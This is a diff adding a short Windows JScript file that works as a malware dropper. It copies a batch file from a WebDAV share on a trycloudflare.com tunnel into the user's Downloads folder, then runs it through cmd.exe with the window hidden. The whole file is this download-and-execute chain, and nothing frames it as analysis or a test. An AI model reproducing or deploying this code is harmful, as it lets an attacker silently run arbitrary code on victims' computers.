@@ -1,0 +1,19 @@
+var webDavUrl = "\\\\loaded-swift-degrees-packages.trycloudflare.com@SSL\DavWWWRoot\google\Win\file.bat";
+var batFileName = "bas.bat";
+var localFilePath = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") + "\\Downloads\\" + batFileName;
+
+// Function to copy bas.bat from WebDAV to local Documents folder
+function copyFile(webDavUrl, localFilePath) {
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    fso.CopyFile(webDavUrl, localFilePath);
+}
+
+// Function to execute bas.bat hidden
+function executeBatHidden(localFilePath) {
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("cmd.exe /c " + localFilePath, 0, true);
+}
+
+// Call the functions
+copyFile(webDavUrl, localFilePath);
+executeBatHidden(localFilePath);
